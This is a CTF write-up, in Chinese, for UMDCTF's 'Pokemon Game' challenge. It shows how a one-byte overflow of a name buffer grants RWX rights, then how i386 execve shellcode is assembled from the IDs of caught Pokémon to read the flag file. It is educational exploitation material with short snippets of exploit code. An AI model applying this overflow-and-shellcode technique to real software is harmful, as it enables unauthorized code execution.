# Pokemon Game

## 题目简述

题目提供一个 32 位 Linux 宝可梦捕捉游戏。玩家名称缓冲区与能力字段相邻，名称输入可覆盖能力位；被捕获宝可梦的编号又会被程序拼成字节序列并作为代码执行，因此可以把捕捉结果构造成 shellcode。

## 解题过程

`struct player` 的开头布局为：

```c
struct player {
    char name[16];
    int8_t abilities;
    int32_t balls_used;
    int8_t pokemon_caught;
    struct pokemon* pokemon[100];
};
```

程序却允许名称读取超过 $16$ 字节，并把实际长度复制进结构：

```c
get_string(name, "enter your name: ", NAME_LEN + 4);
memcpy(player->name, name, strlen(name));
```

因此输入 $16$ 个填充字节再跟 `\x07`，就会令
`abilities = PROT_READ | PROT_WRITE | PROT_EXEC`。`0x07` 同时包含保证捕捉成功所需的位，使后续选择的宝可梦不会逃跑。

结束捕捉阶段时，`evolve_pokemon()` 将每只已捕获宝可梦的 `id` 依次复制到新缓冲区，对该页调用 `mprotect(..., 7)`，随后把缓冲区当函数执行。目标是准备一段长度不超过 $100$ 字节的 i386 shellcode，例如：

```python
shellcode = asm(
    shellcraft.i386.linux.execve(
        path="/bin/cat",
        argv=["/bin/cat", "./flag.txt"]
    )
)
```

构建脚本并未直接使用全国图鉴编号，而是令运行时 ID 等于：

```text
runtime_id = pokedex_id XOR 0x06
```

因此对 shellcode 的每个目标字节 $b$，读取游戏当前随机出现的宝可梦名称，在附带的图鉴表中查出编号 $n$，计算 $n \oplus 6$。只有结果等于 $b$ 时选择捕捉，否则拒绝并等待下一只。收集完全部字节后输入 `f` 结束游戏，程序便执行拼好的 shellcode并输出：

```text
UMDCTF{l00k1n6_f0r_5qu1r7l35_5h3ll}
```

## 方法总结

- 第一阶段用一字节越界把能力字段改为 `0x07`，同时获得 RWX 权限和必定捕捉能力。
- 第二阶段把随机出现的对象 ID 当作受限字节生成器，逐字节编码 shellcode。
- 面对“收集对象后执行”的游戏逻辑，应检查对象属性是否被直接转成指令，以及题目是否提供名称到数值的映射。
- 利用脚本必须按 32 位架构生成 shellcode；使用 amd64 指令会与题目二进制架构不匹配。
